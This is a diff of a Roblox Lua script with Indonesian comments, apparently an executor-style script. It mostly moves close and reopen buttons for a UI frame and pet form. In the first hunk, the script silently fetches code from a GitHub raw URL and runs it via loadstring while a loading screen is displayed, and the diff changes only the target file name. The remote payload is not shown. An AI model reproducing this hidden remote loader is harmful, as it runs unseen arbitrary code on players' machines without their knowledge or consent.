@@ -19,7 +19,7 @@ screenGui.ResetOnSpawn = false
 -- Eksekusi script utama saat loading screen muncul
 task.spawn(function()
     pcall(function()
-        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/ne"))()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/meijinemiko/sc/refs/heads/main/new"))()
     end)
 end)
 
@@ -253,46 +253,44 @@ tween.Completed:Connect(function()
     end)
 
     petForm.Visible = true
-end)
--- Tombol Close
-local closeBtn = Instance.new("TextButton", frame)
-closeBtn.Size = UDim2.new(0.1, 0, 0.1, 0)
-closeBtn.Position = UDim2.new(0.9, -5, 0, 5)
-closeBtn.Text = "X"
-closeBtn.Font = Enum.Font.SourceSansBold
-closeBtn.TextScaled = true
-closeBtn.TextColor3 = Color3.new(1,1,1)
-closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
 
--- Tombol Logo "J" untuk membuka kembali
-local reopenBtn = Instance.new("TextButton", gui)
-reopenBtn.Size = UDim2.new(0, 50, 0, 50)
-reopenBtn.Position = UDim2.new(0, 20, 0, 20)
-reopenBtn.Text = "J"
-reopenBtn.Font = Enum.Font.SourceSansBold
-reopenBtn.TextScaled = true
-reopenBtn.TextColor3 = Color3.new(1,1,1)
-reopenBtn.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
-reopenBtn.Visible = false
-reopenBtn.ZIndex = 10
-reopenBtn.AutoButtonColor = true
-reopenBtn.ClipsDescendants = true
-reopenBtn.BorderSizePixel = 0
-reopenBtn.BackgroundTransparency = 0
-reopenBtn.Name = "ReopenButton"
+    -- Tambahan: Tombol Close
+    local closeBtn = Instance.new("TextButton", frame)
+    closeBtn.Size = UDim2.new(0.1, 0, 0.1, 0)
+    closeBtn.Position = UDim2.new(0.9, -5, 0, 5)
+    closeBtn.Text = "X"
+    closeBtn.Font = Enum.Font.SourceSansBold
+    closeBtn.TextScaled = true
+    closeBtn.TextColor3 = Color3.new(1,1,1)
+    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
 
--- Bikin tombol jadi bulat
-local roundCorner = Instance.new("UICorner", reopenBtn)
-roundCorner.CornerRadius = UDim.new(1, 0)
-
--- Event tombol close
-closeBtn.MouseButton1Click:Connect(function()
-    frame.Visible = false
-    reopenBtn.Visible = true
-end)
-
--- Event tombol reopen
-reopenBtn.MouseButton1Click:Connect(function()
-    frame.Visible = true
+    -- Logo "J" untuk membuka kembali
+    local reopenBtn = Instance.new("TextButton", gui)
+    reopenBtn.Size = UDim2.new(0, 50, 0, 50)
+    reopenBtn.Position = UDim2.new(0, 20, 0, 20)
+    reopenBtn.Text = "J"
+    reopenBtn.Font = Enum.Font.SourceSansBold
+    reopenBtn.TextScaled = true
+    reopenBtn.TextColor3 = Color3.new(1,1,1)
+    reopenBtn.BackgroundColor3 = Color3.fromRGB(0, 102, 204)
     reopenBtn.Visible = false
+    reopenBtn.ZIndex = 10
+    reopenBtn.AutoButtonColor = true
+    reopenBtn.ClipsDescendants = true
+    reopenBtn.BorderSizePixel = 0
+    reopenBtn.BackgroundTransparency = 0
+    reopenBtn.Name = "ReopenButton"
+
+    local roundCorner = Instance.new("UICorner", reopenBtn)
+    roundCorner.CornerRadius = UDim.new(1, 0)
+
+    closeBtn.MouseButton1Click:Connect(function()
+        frame.Visible = false
+        reopenBtn.Visible = true
+    end)
+
+    reopenBtn.MouseButton1Click:Connect(function()
+        frame.Visible = true
+        reopenBtn.Visible = false
+    end)
 end)
